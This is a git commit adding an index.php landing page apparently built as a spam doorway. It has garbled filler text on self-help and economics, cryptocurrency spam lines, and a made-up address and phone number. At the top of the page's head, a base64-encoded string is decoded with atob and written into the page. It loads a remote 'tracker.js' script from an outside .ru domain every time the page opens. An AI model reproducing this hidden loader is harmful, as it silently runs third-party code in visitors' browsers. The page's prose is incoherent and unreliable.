850c9de8eacb832cdd0de78c323895a38b5297b0
zkzlhwxd <81922131+zkzlhwxd@users.noreply.github.com>
2021-04-04 19:43:04 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9ldnJuamkxYnhhYWRiaDJyeHkiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Consider the words of Joseph Addison [16]: “When I look at the graves</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="v9z8ulkc1ufgdqjmzrah3l">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="d812zb5eow9vhbp">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Consider the words of Joseph Addison [16]: “When I look at the graves</h1>
+	</section>
+
+
+	<section class="our-work" class="mtk0i71tjp07w4okxskjn">
+		<h3 class="title">All four of these factors - security, focus, wisdom</h3>
+		<p>The natural monopoly is based on the features of production technologies and consumer services. China Official Coin: Singapore, South Korea, Malaysia.  However, those people who get good jobs as a result are proactive: they solve problems, not talk about them, they take initiative and, based on the right principles, do whatever is necessary to get the task done.  It is defined as the product of the average price by the number of units sold.  And what matters to them is that they themselves get what they want.When there is no point in competition and dispute, the "Win" attitude is probably the most common approach to everyday negotiations.  Nominal and real wages do not necessarily move in the same direction. </p>
+		<hr>
+
+		<ul class="grid" class="bev0zh9rb0yg0xwv993nt">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="mtk0i71tjp07w4okxskjn">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>Everything I did for several months was crossed out.  You can stop the negative tendencies passed down from generation to generation in</td>
+    <td>Based on principles, they deliver the best long-term results possible.  But this universal principle manifests itself with th</td>
+    <td>There are people who are so absorbed in church rituals and activities that they become indifferent to pressing human needs and come into confl</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>One plus one equals three or more.  Fig 2.  To be honest is to speak the truth, to ensure that our words correspond to reality.  I have read and review</td>
+    <td>It is also the foundation for the Daily Community Victory.  If I try to use the strategy and tactics of influencing people in order to get others to</td>
+    <td>The demand curve can be presented non-linearly.  So, people have a desire to save them.In metal circulation, this function of money p</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>OPTIONS OF A FIRM'S EQUILIBRIUM IN THE SHORT AND LONG TERM PERIOD Equilibrium means such a state of the market,which at a</td>
+    <td>There are people who are so absorbed in church rituals and activities that they become indifferent to pressing human needs and come </td>
+    <td>At the end of the year, some abnormal eel, swimming superbly, as well as running, climbing trees and flying a little, turned out to be the best student - and it wa</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="v9z8ulkc1ufgdqjmzrah3l">
+		<h3 class="title">The great reformer Martin Luther is credit</h3>
+		<p>He would continue to adhere to the Win / Win approach until a decision is made that suits both parties.  So often it turns out that the problem is in the system, not in the people! If you put good people in a bad system, you will get bad results.Watering requiredflowers that you want to grow.  And the courtyard became greener and cleaner than in the days when I tended it.  When faced with economic scarcity, the consumer must make compromises.  These elements provide an effective way to clarify and manage the expectations of the people involved in the interdependent venture.  Sunday (or another day that is special to you due to your faith or other circumstances) is often the best time to do your most personal, most exalted things, including weekly planning.  Consequently, he receives additional profit.  It requires a deeper understanding, careful analysis, thoughtful expressions and many revisions in search of the final version.  She estimates the costs based on the results of already completed transactions.  The total number of unemployed of both types is often referred to as the natural unemployment rate. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="d812zb5eow9vhbp" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="mtk0i71tjp07w4okxskjn">
+		<h3 class="title">PROFIT TAX Profit - income received, reduced by the amount of e</h3>
+		<p>This caused some commotion in the organization. Chinese Coin: Sales Open In Today.  You did not evaluate, question, advise, or interpret.  2.  I have only one task left, and I came to ask if you or any of your employees can take the time to show me what and how to do? As a result, interns spent half a day in the units instead of two weeks.  There may be several excellent students, but the "best of the best" - only one.  It's four o'clock in the afternoon.  They may try to replenish stocks by increasing output.  In a life centered on the church, a person may have an idea of ​​the exaggerated importance of the image and the need to create appearance.  PRODUCTION FUNCTION, PRODUCTION FORCES,PRODUCTION RELATIONS A production function is the efficient release of products from different factors of production. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="bev0zh9rb0yg0xwv993nt" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="bev0zh9rb0yg0xwv993nt" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="v9z8ulkc1ufgdqjmzrah3l">
+		<h3 class="title">I am grateful to many thinkers for their inspiratio</h3>
+		<p>Direct control, indirect control, out of control The problems that we face fall into one of three categories: problems under direct control (problems that depend on us to solve); problems under indirect control (problems whose solution depends on other people); problems out of control (problems that cannot be solved, for example, our past or an already existing real situation).  Non-profit organizations do not have the main purpose of their activities to make a profit and do not distribute the received profit among the participants (founders).They can carry out entrepreneurial activity only insofar as it serves to achieve the goals for which they were created.  She sees herself as a means of connecting divine power with human nature.  Imagine what will happenif you and your boss have different ideas about whose role it is to write a job description.  A spirit of respect and gratitude descended on those present - respect for the individuality of this person and gratitude for his courage.  But at its core, your Personal Mission becomes your constitution, a clear expression of your vision and your values.  This creates serious problems for both the people themselves and the business, especially if competitors operate on a Win / Win approach and synergy.  One of the alternatives to price behavior in oligopolistic markets is price leadership.  Our harsh, realistic business world is not like that.  Show them that you deeply understand their interests.  In it, forced unemployment is inevitable.  International and long distance telephone calls are more expensive during the daytime and cheaper at night.  It involves the use in our relations with other people of all the unique properties of a person - self-awareness, imagination, conscience and independent will. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="d812zb5eow9vhbp" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="mtk0i71tjp07w4okxskjn">
+		<h3 class="title">Non-price factors affecting supply 1.  The</h3>
+		<p>Where does the feeling of personal security come from? It does not arise from what other people think of us or how they treat us.  The level of competition depends on the ability of an enterprise to effectively compete with manufacturers of similar products.  There are two forms of such replacement - the replacement of individual elements of the means of labor with new ones that have similar characteristics,what restores the lost consumer properties of the machine; Simultaneously with the replacement, modernization can also occur, which implies the improvement of the production and operational properties of machines and equipment.  In the end, he never did anything.  We agreed that my daughter would use the car only in case of serious need and that, when necessary, she would serve my mother and me as a driver. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="bev0zh9rb0yg0xwv993nt" class="title">The strength of the Seven Habits and the principles embedded in</h3>	
+		<p>The role of the leading principle in the formation of the assortment is to combine the resources of the enterprise with external factors, to develop and implement a product policy. China Official Coin: Singapore, South Korea, Malaysia.  But when we violate the basic laws of love - when we give this gift with a load of hidden thoughts and conditions - then we encourage others to violate the basic laws of life.  We tried to liberate his consciousness with the help of deep breathing and progressive muscle relaxation techniques, thanks to which he came to a state of complete inner peace.  Therefore, remember that there is always a “Do Not Connect” option. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="v9z8ulkc1ufgdqjmzrah3l">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="d812zb5eow9vhbp"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="mtk0i71tjp07w4okxskjn"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="bev0zh9rb0yg0xwv993nt"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>08522 Cummings Trail, Apt. 447, 46918, New Rowanborough, Arizona, United States</p>
+		<p>Phone number: +7158115699810541</p>
+	</footer>
+
+</body>
+
+</html>
